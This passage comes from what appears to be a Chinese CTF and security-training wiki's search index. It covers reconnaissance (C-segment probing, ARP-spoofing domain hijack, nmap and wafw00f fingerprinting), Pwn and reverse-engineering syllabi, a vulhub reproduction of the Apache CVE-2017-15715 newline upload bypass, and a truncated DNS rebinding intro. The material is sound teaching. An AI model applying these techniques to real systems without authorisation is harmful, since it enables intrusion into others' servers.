\u5bf9\u4e8e\u9632\u62a4\u6bd4\u8f83\u5f3a\u7684\u4e3b\u7ad9\uff0c\u901a\u5e38\u662f\u5f88\u96be\u6316\u6398\u5230\u6f0f\u6d1e\u7684\uff0c\u8fd9\u65f6\u9700\u8981\u67e5\u770b\u8be5\u7ad9\u70b9\u7684\u65c1\u7ad9\uff0c\u901a\u8fc7\u63a2\u6d4b\u65c1\u7ad9\u7684\u6f0f\u6d1e\u8fdb\u884c\u5229\u7528\uff0c\u4ece\u800c\u62ff\u4e0b\u4e3b\u7ad9\u7684\u6743\u9650\u3002\u5f53\u7f51\u7ad9\u4e0d\u5b58\u5728\u65c1\u7ad9\u65f6\uff0c\u5c31\u9700\u8981\u8fdb\u884cC\u6bb5\u63a2\u6d4b\uff08\u6709\u4e9b\u7f51\u7ad9\u4e70\u65ad\u4e86\u76f8\u90bb\u7684\u51e0\u4e2aIP\u505a\u4e3a\u5206\u7ad9\uff0c\u5982\u679c\u62ff\u5230\u5206\u7ad9\u7684\u7ba1\u7406\u5458\u654f\u611f\u4fe1\u606f\uff0c\u5982\u5bc6\u7801\u4e4b\u7c7b\u7684\uff0c\u53ef\u4ee5\u5c1d\u8bd5\u5bf9\u4e3b\u7ad9\u8fdb\u884c\u649e\u5e93\uff09\uff0c\u901a\u8fc7\u62ff\u4e0bC\u6bb5\u4e2d\u670d\u52a1\u5668\u8fdb\u884cARP\u6b3a\u9a97\u8fbe\u5230\u52ab\u6301\u57df\u540d\u7684\u6548\u679c \u5bf9\u4e8e\u7ea2\u84dd\u5bf9\u6297\u548c\u62a4\u7f51\uff0cC\u6bb5\u626b\u63cf\u6bd4\u8f83\u6709\u610f\u4e49\u3002\u5bf9\u4e8e\u5355\u72ec\u7f51\u7ad9\u7684\u6e17\u900f\u6d4b\u8bd5\uff0cC\u6bb5\u626b\u63cf\u610f\u4e49\u4e0d\u5927\u3002C\u6bb5\u6307\u7684\u662f\u540c\u4e00\u5185\u7f51\u6bb5\u5185\u7684\u5176\u4ed6\u670d\u52a1\u5668\uff0c\u6bcf\u4e2aIP\u6709ABCD\u56db\u4e2a\u6bb5\uff0c\u4e3e\u4e2a\u4f8b\u5b50\uff0c192.168.0.1\uff0cA\u6bb5\u5c31\u662f192\uff0cB\u6bb5\u662f168\uff0cC\u6bb5\u662f0\uff0cD\u6bb5\u662f1\uff0c\u800cC\u6bb5\u55c5\u63a2\u7684\u610f\u601d\u5c31\u662f\u62ff\u4e0b\u5b83\u540c\u4e00C\u6bb5\u4e2d\u7684\u5176\u4e2d\u4e00\u53f0\u670d\u52a1\u5668\uff0c\u4e5f\u5c31\u662f\u8bf4\u662fD\u6bb51-255\u4e2d\u7684\u4e00\u53f0\u670d\u52a1\u5668\uff0c\u7136\u540e\u5229\u7528\u5de5\u5177\u55c5\u63a2\u62ff\u4e0b\u8be5\u670d\u52a1\u5668\u3002</p>"},{"location":"WEB/others/%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/#_26","title":"\u6574\u7ad9\u5206\u6790","text":""},{"location":"WEB/others/%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/#_27","title":"\u670d\u52a1\u5668\u7c7b\u578b","text":"<p>\u670d\u52a1\u5668\u4fe1\u606f\u5305\u62ec\u670d\u52a1\u5668\u7528\u7684\u64cd\u4f5c\u7cfb\u7edf\uff1aLinux \u8fd8\u662f Windows \u3002\u73b0\u5728\u4f01\u4e1a\u7f51\u7ad9\u670d\u52a1\u5668\u7684\u64cd\u4f5c\u7cfb\u7edf\u6709\u767e\u5206\u4e4b\u4e5d\u5341\u4ee5\u4e0a\u7528\u7684\u662fLinux\u64cd\u4f5c\u7cfb\u7edf\u3002\u77e5\u9053\u4e86\u670d\u52a1\u5668\u7684\u64cd\u4f5c\u7cfb\u7edf\u4e4b\u540e\uff0c\u8fd8\u9700\u8981\u77e5\u9053\u64cd\u4f5c\u7cfb\u7edf\u4f7f\u7528\u7684\u5177\u4f53\u7248\u672c\u3002\u56e0\u4e3a\u5f88\u591a\u4f4e\u7248\u672c\u7684\u64cd\u4f5c\u7cfb\u7edf\u90fd\u5b58\u5728\u5df2\u77e5\u7684\u6f0f\u6d1e\u3002\u5224\u65ad\u662fLinux\u8fd8\u662fWindows\u6700\u7b80\u5355\u5c31\u662f\u901a\u8fc7ping\u6765\u63a2\u6d4b\uff0cWindows\u7684TTL\u503c\u90fd\u662f\u4e00\u822c\u662f128\uff0cLinux\u5219\u662f64\u3002\u6240\u4ee5\u5927\u4e8e100\u7684\u80af\u5b9a\u662fWindows\uff0c\u800c\u51e0\u5341\u7684\u80af\u5b9a\u662fLinux\u3002\u4f46\u662f\uff0c\u901a\u8fc7TTL\u503c\u6765\u5224\u65ad\u670d\u52a1\u5668\u7c7b\u578b\u4e5f\u4e0d\u662f\u767e\u5206\u4e4b\u767e\u51c6\u786e\u7684\uff0c\u6709\u4e9bwindows\u670d\u52a1\u5668\u7684TTL\u503c\u4e5f\u662f\u51e0\u5341\uff0c\u800c\u4e14\u6709\u7684\u670d\u52a1\u5668\u7981\u6b62ping\u3002</p> <p>\u800c\u5224\u65ad\u76ee\u6807\u7f51\u7ad9\u670d\u52a1\u5668\u7684\u5177\u4f53\u7684\u7248\u672c\u7684\u8bdd\uff0c\u53ef\u4ee5\u91c7\u7528 nmap \u8fdb\u884c\u626b\u63cf\uff0c -O \u548c -A \u53c2\u6570\u90fd\u80fd\u626b\u63cf\u51fa\u6765</p> <p>\u68c0\u6d4b\u670d\u52a1\u5668\u5e73\u53f0\u3001\u7248\u672c\u7b49\uff0c\u83b7\u53d6\u540e\u53ef\u4ee5\u5236\u5b9a\u6f0f\u6d1e\u6316\u6398\u65b9\u6848\uff08\u5982IIS6.0\u5b58\u5728\u89e3\u6790\u6f0f\u6d1e\u7b49\uff09\u3002\u5c06\u9996\u9875\u6216\u8005\u5176\u4ed6\u9875\u9762\u901a\u8fc7\u4fee\u6539\u5927\u5c0f\u5199\u8fa8\u522b\u7f51\u7ad9\u6240\u4f7f\u7528\u7684\u7cfb\u7edf\uff1a\u533a\u5206\u5927\u5c0f\u5199\uff08\u9875\u9762\u62a5\u9519\uff09--Linux \u4e0d\u533a\u5206\u5927\u5c0f\u5199\uff08\u9875\u9762\u6b63 \u5e38\uff09--Windows</p>"},{"location":"WEB/others/%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/#_28","title":"\u7f51\u7ad9\u5bb9\u5668","text":"<p>\u77e5\u9053\u4e86\u8fd9\u4e9b\u4fe1\u606f\u4e4b\u540e\uff0c\u6211\u4eec\u5c31\u9700\u8981\u77e5\u9053\u7f51\u7ad9\u7528\u7684web\u670d\u52a1\u5668\u662f\u4ec0\u4e48\u7c7b\u578b\u7684\uff1aApache\u3001Nginx\u3001Tomcat \u8fd8\u662f IIS\u3002\u77e5\u9053\u4e86web\u670d\u52a1\u5668\u662f\u54ea\u79cd\u7c7b\u578b\u540e\uff0c\u6211\u4eec\u8fd8\u8981\u63a2\u6d4bweb\u670d\u52a1\u5668\u5177\u4f53\u7684\u7248\u672c\u3002\u6bd4\u5982Ngnix\u7248\u672c&lt;0.83\u4f1a\u6709\u89e3\u6790\u6f0f\u6d1e \uff0cIIS6.0\u4f1a\u6709\u6587\u4ef6\u540d\u89e3\u6790\u6f0f\u6d1e\u3001IIS7.0\u4f1a\u6709\u7578\u5f62\u89e3\u6790\u6f0f\u6d1e\u7b49\u3002\u4e0d\u540c\u7684web\u670d\u52a1\u5668\u7248\u672c\uff0c\u5b58\u5728\u7740\u4e0d\u540c\u6f0f\u6d1e\u3002\u642d\u5efa\u7f51\u7ad9\u7684\u670d\u52a1\u7ec4\u4ef6\uff0c\u4f8b\u5982\uff1aiis\u3001Apache\u3001nginx\u3001tomcat\u7b49\uff0c\u901a\u8fc7\u7f51\u7ad9\u5bb9\u5668\u5224\u65ad\u5b58\u5728\u7684\u6f0f\u6d1e\uff08\u5982\uff1aApache\u89e3\u6790\u6f0f\u6d1e\uff0cnginx\u89e3\u6790\u6f0f\u6d1e\uff09\u3002</p>"},{"location":"WEB/others/%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/#_29","title":"\u811a\u672c\u7c7b\u578b","text":"<p>\u6211\u4eec\u9700\u8981\u77e5\u9053\u7f51\u7ad9\u7528\u7684\u811a\u672c\u7c7b\u578b\uff1aphp \u3001Jsp \u3001Asp \u3001Aspx </p> <p>1\uff09\u53ef\u4ee5\u6839\u636e\u7f51\u7ad9URL\u6765\u5224\u65ad</p> <p>2\uff09site:xxxfiletype:php</p> <p>3\uff09\u53ef\u4ee5\u6839\u636eFirefox\u7684\u63d2\u4ef6\u6765\u5224\u65ad</p>"},{"location":"WEB/others/%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/#cms","title":"CMS\u7c7b\u578b","text":"<p>\u5728\u6e17\u900f\u6d4b\u8bd5\u4e2d\uff0c\u5bf9\u76ee\u6807\u670d\u52a1\u5668\u8fdb\u884c\u6307\u7eb9\u8bc6\u522b\u662f\u76f8\u5f53\u6709\u5fc5\u8981\u7684\uff0c\u56e0\u4e3a\u53ea\u6709\u8bc6\u522b\u51fa\u76f8\u5e94\u7684Web\u5bb9\u5668\u6216\u8005CMS\uff0c\u624d\u80fd\u67e5\u627e\u4e0e\u5176\u76f8\u5173\u7684\u6f0f\u6d1e\uff0c\u7136\u540e\u624d\u80fd\u8fdb\u884c\u76f8\u5e94\u7684\u6e17\u900f\u64cd\u4f5c\u3002\u8fd9\u662f\u6211\u4eec\u60f3\u8981\u8bc6\u522b\u8fd9\u4e9b\u7f51\u7ad9\u7684\u6307\u7eb9\uff0c\u6211\u4eec\u5c31\u53ef\u4ee5\u5229\u7528\u4ee5\u4e0b\u4e00\u4e9b\u6307\u7eb9\u8bc6\u522b\u5728\u7ebf\u7f51\u7ad9\u3002\u8bc6\u522bdedecms\u3001phpcms\u3001emlog\u3001\u5e1d\u56fdcms\u7b49\uff0c\u901a\u8fc7\u7f51\u7ad9\u4f7f\u7528\u7684CMS\u627e\u53d6\u8be5CMS\u5df2\u7ecf\u516c\u5e03\u7684\u6f0f\u6d1e\u8fdb\u884c\u5229\u7528\uff0c\u8fdb\u4e00\u6b65\u6e17\u900f\u7f51\u7ad9\u3002</p>"},{"location":"WEB/others/%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/#_30","title":"\u5de5\u5177","text":"<p>\u4e91\u6089\u6307\u7eb9https://www.yunsee.cn/ <code>ThreatScan</code>https://scan.top15.cn/web/</p> <p><code>wappalyzer</code>https://www.wappalyzer.com/</p> <p><code>BugScaner</code>http://whatweb.bugscaner.com/</p>"},{"location":"WEB/others/%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/#_31","title":"\u6570\u636e\u5e93\u7c7b\u578b","text":"<p>\u5728\u8fdb\u884c\u6e17\u900f\u6d4b\u8bd5\u6216\u4fe1\u606f\u6536\u96c6\u8fc7\u7a0b\u4e2d\uff0c\u4e86\u89e3\u76ee\u6807\u7f51\u7ad9\u6240\u7528\u7684\u6570\u636e\u5e93\u7c7b\u578b\u53ca\u7248\u672c\u662f\u81f3\u5173\u91cd\u8981\u7684\u3002\u5e38\u89c1\u7684\u6570\u636e \u5e93\u7c7b\u578b\u5305\u62ec Mysql\u3001Oracle\u3001SQL Server\u3001PostgreSQL \u548c Access\uff0c\u5b83\u4eec\u6709\u7740\u4e0d\u540c\u7684\u7279\u70b9\u548c\u7528\u9014\u3002</p>"},{"location":"WEB/others/%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/#_32","title":"\u7aef\u53e3\u5bf9\u5e94\u6570\u636e\u5e93\u7c7b\u578b","text":"<ul> <li>SQL Server\uff1a\u7aef\u53e3\u53f7 1433</li> <li>Oracle\uff1a\u7aef\u53e3\u53f7 1521</li> <li>MySQL\uff1a\u7aef\u53e3\u53f7 3306</li> <li>PostgreSQL\uff1a\u7aef\u53e3\u53f7 5432</li> <li>Access\uff1a\u9ed8\u8ba4\u4e0d\u5f00\u653e\u8fde\u63a5\u7aef\u53e3\uff0c\u6570\u636e\u5e93\u5b58\u50a8\u5728 FTP \u670d\u52a1\u5668\u4e0a</li> </ul>"},{"location":"WEB/others/%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/#waf","title":"WAF","text":"<p>\u5224\u65ad\u5b89\u5168\u72d7\u3001\u963f\u91cc\u4e91\u4e91\u76fe\u3001360\u7f51\u7ad9\u536b\u58eb\u3001\u62a4\u536b\u795e\u7b49WEB\u5e94\u7528\u7a0b\u5e8f\u9632\u706b\u5899\uff0c\u4fbf\u4e8e\u91c7\u53d6\u7ed5\u8fc7WAF\u7684\u529e\u6cd5\u3002Nmap\u63a2\u6d4bWAF\u6709\u4e24\u79cd\u811a\u672c\u3002\u4e00\u79cd\u662fhttp-waf-detect\u3002\u547d\u4ee4\uff1anmap -p80,443 --script=http-waf-detectip \u4e00\u79cd\u662fhttp-waf-fingerprint\u3002\u547d\u4ee4\uff1anmap -p80,443 --script=http-waf-fingerprint ip WAFW00F\u63a2\u6d4bWAF \u547d\u4ee4\uff1awafw00f -a \u57df\u540d</p>"},{"location":"WEB/peixun/pwn%E5%9F%B9%E8%AE%AD/","title":"Pwn\u57f9\u8bad","text":""},{"location":"WEB/peixun/pwn%E5%9F%B9%E8%AE%AD/#pwn","title":"PWN\u57f9\u8bad","text":"<ol> <li>\u4e86\u89e3\u51fd\u6570\u8c03\u7528\u6808\u7684\u539f\u7406\u4ee5\u53ca\u6808\u5e27\u6982\u5ff5\uff0c\u53ef\u53c2\u8003\u4e0b\u5217\u6587\u7ae0\uff1a    https://www.yuque.com/cyberangel/rg9gdm/gcz7x2    https://www.cnblogs.com/clover-toeic/p/3755401.html    https://www.cnblogs.com/clover-toeic/p/3756668.html</li> <li>\u4e86\u89e3\u4fdd\u62a4\u673a\u5236\uff0c\u6808\u6ea2\u51fa\u539f\u7406\uff0c\u53c2\u8003\u6587\u7ae0\uff1a    https://ctf-wiki.org/pwn/linux/user-mode/stackoverflow/x86/stackoverflow-basic/</li> <li>\u914d\u7f6epwn\u73af\u5883\u7684\u865a\u62df\u673a\uff1aUbuntu64\u4f4d\u7cfb\u7edf\uff0c\u5b89\u88c5pwntools\uff0cpwndgb\uff08GDB-Plugins\uff09\uff0clibcsearcher\u52a8\u6001\u5e93\uff08\u914d\u4e0d\u597d\u5c31\u5148\u88c5\u5b8cpwntools\u548cGDB-Plugins\uff09</li> <li>pwndbg\u57fa\u7840\u52a8\u6001\u8c03\u8bd5\u7684\u4f7f\u7528</li> <li>\u4e86\u89e3ret2text\uff0c\u5b8c\u6210buuctf\u4e0a\u7684\u524d3\u9898</li> </ol> <p>PS\uff1a\u7b2c2\u6761\u548c\u7b2c4\u6761\u53ef\u4ee5\u53c2\u8003B\u7ad9\u4e0a\u7684\u89c6\u9891\u300a\u4f60\u60f3\u6709\u591aPWN\u300b\u524d5\u8282\u5b66\u4e60\uff0c\u5b66\u6709\u4f59\u529b\u7684\u540c\u5b66\u53ef\u4ee5\u4e86\u89e3CTF-wiki\u4e0a\u57fa\u672cROP\u7684\u6587\u7ae0\uff0c\u8bd5\u7740\u505abuuctf\u540e\u9762\u7684\u9898 https://ctf-wiki.org/pwn/linux/user-mode/stackoverflow/x86/basic-rop/#ret2text</p> <p>\u865a\u62df\u673a\u5b89\u88c5\u597d\u4e4b\u540e\u6362\u6e90</p> <p>https://www.yuque.com/hxfqg9/bin/hg3qeh</p> <p>https://www.myfreax.com/ubuntu-22-04geng-gai-jing-xiang-ruan-jian-yuan/</p>"},{"location":"WEB/peixun/reverse%E5%9F%B9%E8%AE%AD/","title":"reverse\u57f9\u8bad","text":"<ol> <li>\u4e86\u89e3\u4e0d\u540c\u8fdb\u5236\u4e4b\u95f4\u7684\u8f6c\u5316\u65b9\u6cd5</li> </ol> Text Only<pre><code>\u4e8c\u8fdb\u5236\n\u5341\u8fdb\u5236 -&gt; \u4e8c\u8fdb\u5236\n\u4e8c\u8fdb\u5236 -&gt; \u5341\u8fdb\u5236\n\u5341\u516d\u8fdb\u5236\n\u5341\u8fdb\u5236 -&gt; \u5341\u516d\u8fdb\u5236\n\u5341\u516d\u8fdb\u5236 -&gt; \u5341\u8fdb\u5236\n</code></pre> <ol> <li> <p>\u4e86\u89e3\u5b57\u957f\u4e0e\u7aef\u5e8f</p> </li> <li> <p>\u4e86\u89e3\u6c47\u7f16\u57fa\u7840\u6307\u4ee4\uff08\u5b8c\u6210\u4e0b\u9762\u7ec3\u4e60\uff09</p> </li> <li> <p>\u4e0b\u8f7d\u5de5\u5177ida\uff0cexeinfope/die\uff08\u4e8c\u9009\u4e00\uff09\u5b8c\u6210<code>BUUCTF</code>,<code>Reverse</code>\u6a21\u5757\u524d\u4e09\u9898</p> </li> <li> <p>\u4e86\u89e3\u51fd\u6570\u8c03\u7528\u6808\u4e0e\u8c03\u7528\u7ea6\u5b9a\u7684\u5b66\u4e60\u8d44\u6599\uff1a</p> </li> </ol> <p>C\u8bed\u8a00\u51fd\u6570\u8c03\u7528\u6808(\u4e00) - clover_toeic - \u535a\u5ba2\u56ed (cnblogs.com)</p> <p>C\u8bed\u8a00\u51fd\u6570\u8c03\u7528\u6808(\u4e8c) - clover_toeic - \u535a\u5ba2\u56ed (cnblogs.com)</p> <ol> <li>\u521d\u6b65\u4e86\u89e3x86\u67b6\u6784\uff1a</li> </ol> <p>\u4ec0\u4e48\u662f\u51af\u8bfa\u4f9d\u66fc\u4f53\u7cfb\u7ed3\u6784</p> <p>\u4ec0\u4e48\u662f\u5bc4\u5b58\u5668</p> <p>\u4ec0\u4e48\u662f\u5806</p> <p>\u4ec0\u4e48\u662f\u6808</p> <p>\u4e86\u89e3\u8fdb\u7a0b\u7a7a\u95f4\u5e03\u5c40\uff08\u5927\u81f4\u4e86\u89e3\u5373\u53ef\uff09</p> <p>\u7ec3\u4e60\uff1a</p> Text Only<pre><code>.text:000011B1                               var_4= dword ptr -4\n.text:000011B1                               arg_0= dword ptr 8\n.text:000011B1 55                            push ebp\n.text:000011B2 89 E5                         mov ebp, esp\n.text:000011B4 83 EC 10                  sub esp, 10h\n.text:000011C1 C7 45 FC 00 00 00 00      mov [ebp+var_4], 0\n.text:000011C8 83 7D 08 00                   cmp [ebp+arg_0], 0\n.text:000011CC 79 09                         jns short loc_11D7\n.text:000011CC\n.text:000011CE C7 45 FC 01 00 00 00      mov [ebp+var_4], 1\n.text:000011D5 EB 34                         jmp short loc_120B\n.text:000011D5\n.text:000011D7                               loc_11D7:\n.text:000011D7 83 7D 08 00                   cmp [ebp+arg_0], 0\n.text:000011DB 75 09                         jnz short loc_11E6\n.text:000011DB\n.text:000011DD C7 45 FC 02 00 00 00      mov [ebp+var_4], 2\n.text:000011E4 EB 25                         jmp short loc_120B\n.text:000011E4\n.text:000011E6                               loc_11E6:\n.text:000011E6 83 7D 08 1D                   cmp [ebp+arg_0], 1Dh\n.text:000011EA 7F 09                         jg short loc_11F5\n.text:000011EA\n.text:000011EC C7 45 FC 03 00 00 00      mov [ebp+var_4], 3\n.text:000011F3 EB 16                     jmp short loc_120B\n.text:000011F3\n.text:000011F5                               loc_11F5:\n.text:000011F5 83 7D 08 45                   cmp [ebp+arg_0], 45h\n.text:000011F9 7F 09                         jg short loc_1204\n.text:000011F9\n.text:000011FB C7 45 FC 04 00 00 00          mov [ebp+var_4], 4\n.text:00001202 EB 07                         jmp short loc_120B\n.text:00001202\n.text:00001204                               loc_1204:\n.text:00001204 C7 45 FC 05 00 00 00      mov [ebp+var_4], 5\n.text:00001204\n.text:0000120B                               loc_120B:\n.text:0000120B 8B 45 FC                  mov eax, [ebp+var_4]\n.text:0000120E C9                            leave\n.text:0000120F C3                            retn\n</code></pre> <p>main \u51fd\u6570\u6309\u7167\u5982\u4e0b\u65b9\u5f0f\u8fdb\u884c\u8c03\u7528\uff1a</p> Text Only<pre><code>.text:00001221 6A 3C                     push 3Ch\n.text:00001223 E8 85 FF FF FF                call test1\n.text:00001228 83 C4 04                  add esp, 4\n</code></pre> <ol> <li>\u8be5\u51fd\u6570\u6709\u51e0\u4e2a\u53c2\u6570</li> <li>\u8be5\u51fd\u6570\u4f7f\u7528\u4e86\u4ec0\u4e48\u51fd\u6570\u8c03\u7528\u7ea6\u5b9a</li> <li>\u5f53\u7a0b\u5e8f\u6267\u884c\u5230 0x1228 \u65f6\uff0ceax \u7684\u503c\u662f\u591a\u5c11</li> <li>\u4f60\u80fd\u8fd8\u539f\u51fa C \u4ee3\u7801\u5417</li> </ol>"},{"location":"WEB/zhuan/Apache%20%E6%8D%A2%E8%A1%8C%E8%A7%A3%E6%9E%90%E6%BC%8F%E6%B4%9E/","title":"Apache \u6362\u884c\u89e3\u6790\u6f0f\u6d1e","text":"<p>\u539f\u6587\u5730\u5740\uff1a Apache HTTPD \u6362\u884c\u89e3\u6790\u6f0f\u6d1e(CVE-2017-15715)\u4e0e\u62d3\u5c55</p> <p>(CVE-2017-15715)</p> <p>\u73af\u5883\u542f\u52a8\u4e0e\u7248\u672c\u6f0f\u6d1e </p> <ol> <li>\u5728<code>apache2.40~2.4.29</code>\u7248\u672c\u4e2d\u5b58\u5728\u8fd9\u4e2a\u6f0f\u6d1e  </li> <li>\u8fd9\u4e48\u6211\u4f7f\u7528\u7684\u662f vulhub \u73af\u5883\u642d\u5efa <code>\u8fdb\u5165\u76ee\u5f55\u7f16\u8bd1\u53ca\u8fd0\u884c\u6f0f\u6d1e\u73af\u5883\uff1a</code> <code>docker-compose build</code> <code>docker-compose up -d</code> \u542f\u52a8\u540e Apache \u8fd0\u884c\u5728 http://your-ip:8080**</li> </ol> <p>\u6f0f\u6d1e\u539f\u7406 \u5728\u8be5\u7248\u672c\u7684\u914d\u7f6e\u4e2d</p> Text Only<pre><code>&lt;FilesMatch \\.php$&gt;\n    SetHandler application/x-httpd-php\n&lt;/FilesMatch&gt;\n</code></pre> <p>\u8be5\u90e8\u5206\u5185\u5bb9\u5c31\u662f\u53ea\u6709\u5339\u914d\u4e0a\u9762\u7684\u6b63\u5219\u8868\u8fbe\u5f0f\u5c31\u53ef\u4ee5\u8fdb\u884c\u7ed5\u8fc7 \u4f7f\u7528\u6211\u4eec\u5728\u770b\u4e00\u770b\u6b63\u5219\u8868\u8fbe\u5f0f\u4e2d<code>$</code>\u7684\u610f\u601d</p> <p>\u5339\u914d\u8f93\u5165\u5b57\u7b26\u4e32\u7684\u7ed3\u5c3e\u4f4d\u7f6e\u3002\u5982\u679c\u8bbe\u7f6e\u4e86 RegExp \u5bf9\u8c61\u7684 Multiline \u5c5e\u6027\uff0c\u5219 <code>$</code>\u4e5f\u5339\u914d \u2018\\n\u2019 \u6216 \u2018\\r\u2019\u3002\u8981\u5339\u914d <code>$</code> \u5b57\u7b26\u672c\u8eab\uff0c\u8bf7\u4f7f\u7528 <code>$</code>\u3002</p> <p>\u6240\u4ee5\u5982\u679c\u8bbe\u7f6e RegExp \u5bf9\u8c61\u7684 Multiline \u5c5e\u6027\u7684\u6761\u4ef6\u4e0b\uff0c$ \u8fd8\u4f1a\u5339\u914d\u5230\u5b57\u7b26\u4e32\u7ed3\u5c3e\u7684\u6362\u884c\u7b26\uff08\u4e5f\u5c31\u662f %0a) </p> <p>\u5b9e\u9a8c \u4e0a\u4f20\u4e00\u4e2a\u540d\u4e3a 1.php \u7684\u6587\u4ef6\uff0c\u88ab\u62e6\u622a\uff1a </p> <p> </p> <p>\u5728 1.php \u540e\u9762\u63d2\u5165\u4e00\u4e2a <code>\\x0A</code>\uff08\u6ce8\u610f\uff0c\u4e0d\u80fd\u662f \\x0D\\x0A\uff0c\u53ea\u80fd\u662f\u4e00\u4e2a \\x0A\uff09\uff0c\u4e0d\u518d\u62e6\u622a\uff1a</p> <p>(\u5b57\u7b26\u4e321.php\u768416\u8fdb\u5236\u4e3a312e706870)  </p> <p></p> <p>\u8bbf\u95ee\u521a\u624d\u4e0a\u4f20\u7684 /1.php%0a\uff0c\u53d1\u73b0\u80fd\u591f\u6210\u529f\u89e3\u6790\uff0c\u4f46\u8fd9\u4e2a\u6587\u4ef6\u4e0d\u662f php \u540e\u7f00\uff0c\u8bf4\u660e\u76ee\u6807\u5b58\u5728\u89e3\u6790\u6f0f\u6d1e\uff1a </p> <p></p> <p>\u53c2\u8003 https://vulhub.org/#/environments/httpd/CVE-2017-15715/ https://www.leavesongs.com/PENETRATION/apache-cve-2017-15715-vulnerability.html</p>"},{"location":"WEB/zhuan/DNS%E9%87%8D%E7%BB%91%E5%AE%9A%E6%BC%8F%E6%B4%9E/","title":"DNS \u91cd\u7ed1\u5b9a\u6f0f\u6d1e","text":"<p>\u4f5c\u8005\uff1aR1dd1er \u5408\u5929\u667a\u6c47</p> <p>\u539f\u6587\uff1ahttps://zhuanlan.zhihu.com/p/89426041</p>"},{"location":"WEB/zhuan/DNS%E9%87%8D%E7%BB%91%E5%AE%9A%E6%BC%8F%E6%B4%9E/#_1","title":"\u524d\u8a00","text":"<p>DNS Rebinding \u662f\u4e00\u4e2a\u6bd4\u8f83\u65e9\u5c31\u51fa\u73b0\u7684\u6f0f\u6d1e, \u672c\u4eba\u4e5f\u662f\u5728\u6700\u8fd1\u7684\u4e00\u4e9b CTF \u6bd4\u8d5b\u7684 web \u9898\u89c1\u8bc6\u5230, \u4fbf\u8bb0\u5f55\u5b66\u4e60\u4e00\u4e0b\u76f8\u5173\u7684\u5185\u5bb9</p>"},{"location":"WEB/zhuan/DNS%E9%87%8D%E7%BB%91%E5%AE%9A%E6%BC%8F%E6%B4%9E/#dns_1","title":"DNS","text":"<p>DNS \u662f Domain Name Service \u7684\u7f29\u5199, \u8ba1\u7b97\u673a\u57df\u540d\u670d\u52a1\u5668, \u5728 Internet \u4e0a\u57df\u540d\u4e0e IP \u5730\u5740\u4e4b\u95f4\u662f\u4e00\u4e00\u5bf9\u5e94\u7684\uff0c\u57df\u540d\u867d\u7136\u4fbf\u4e8e\u4eba\u4eec\u8bb0\u5fc6\uff0c\u4f46\u673a\u5668\u4e4b\u95f4\u53ea\u80fd\u4e92\u76f8\u8ba4\u8bc6 IP \u5730\u5740\uff0c\u5b83\u4eec\u4e4b\u95f4\u7684\u8f6c\u6362\u5de5\u4f5c\u79f0\u4e3a\u57df\u540d\u89e3\u6790\uff0c\u800c\u57df\u540d\u89e3\u6790\u9700\u8981\u7531\u4e13\u95e8\u7684\u57df\u540d\u89e3\u6790\u670d\u52a1\u5668\u6765\u5b8c\u6210\uff0c\u8fd9\u5c31\u662f DNS \u57df\u540d\u670d\u52a1\u5668\u3002</p> <p>\u66f4\u5177\u4f53\u8be6\u7ec6\u7684\u4ecb\u7ecd\u53ef\u4ee5\u53c2\u8003 http://www.ruanyifeng.com/blog/2016/06/dns.html</p>"},{"location":"WEB/zhuan/DNS%E9%87%8D%E7%BB%91%E5%AE%9A%E6%BC%8F%E6%B4%9E/#dns-ttl","title":"DNS TTL","text":"<p>TTL \u503c\u5168\u79f0\u662f \u201c\u751f\u5b58\u65f6\u95f4\uff08Time To Live)\u201d\uff0c\u7b80\u5355\u7684\u8bf4\u5b83\u8868\u793a DNS \u8bb0\u5f55\u5728 DNS \u670d\u52a1\u5668\u4e0a\u7f13\u5b58\u65f6\u95f4\uff0c\u6570\u503c\u8d8a\u5c0f\uff0c\u4fee\u6539\u8bb0\u5f55\u5404\u5730\u751f\u6548\u65f6\u95f4\u8d8a\u5feb\u3002</p> <p>\u5f53\u5404\u5730\u7684 DNS(LDNS) \u670d\u52a1\u5668\u63a5\u53d7\u5230\u89e3\u6790\u8bf7\u6c42\u65f6\uff0c\u5c31\u4f1a\u5411\u57df\u540d\u6307\u5b9a\u7684\u6388\u6743 DNS \u670d\u52a1\u5668\u53d1\u51fa\u89e3\u6790\u8bf7\u6c42\u4ece\u800c\u83b7\u5f97\u89e3\u6790\u8bb0\u5f55\uff1b\u8be5\u89e3\u6790\u8bb0\u5f55\u4f1a\u5728 DNS(LDNS) \u670d\u52a1\u5668\u4e2d\u4fdd\u5b58\u4e00\u6bb5\u65f6\u95f4\uff0c\u8fd9\u6bb5\u65f6\u95f4\u5185\u5982\u679c\u518d\u63a5\u5230\u8fd9\u4e2a\u57df\u540d\u7684\u89e3\u6790\u8bf7\u6c42\uff0cDNS \u670d\u52a1\u5668\u5c06\u4e0d\u518d\u5411\u6388\u6743 DNS \u670d\u52a1\u5668\u53d1\u51fa\u8bf7\u6c42\uff0c\u800c\u662f\u76f4\u63a5\u8fd4\u56de\u521a\u624d\u83b7\u5f97\u7684\u8bb0\u5f55\uff1b\u800c\u8fd9\u4e2a\u8bb0\u5f55\u5728 DNS \u670d\u52a1\u5668\u4e0a\u4fdd\u7559\u7684\u65f6\u95f4\uff0c\u5c31\u662f TTL \u503c\u3002</p> <p>\u5e38\u89c1\u7684\u8bbe\u7f6e TTL \u503c\u7684\u573a\u666f</p> <p>1. \u589e\u5927 TTL \u503c\uff0c\u4ee5\u8282\u7ea6\u57df\u540d\u89e3\u6790\u65f6\u95f4</p> <p>\u901a\u5e38\u60c5\u51b5\u4e0b\u57df\u540d\u89e3\u6790\u8bb0\u5f55\u662f\u5f88\u5c11\u66f4\u6539\u7684\u3002\u6211\u4eec\u53ef\u4ee5\u901a\u8fc7\u589e\u5927\u57df\u540d\u8bb0\u5f55\u7684 TTL \u503c\u8ba9\u8bb0\u5f55\u5728\u5404\u5730 DNS 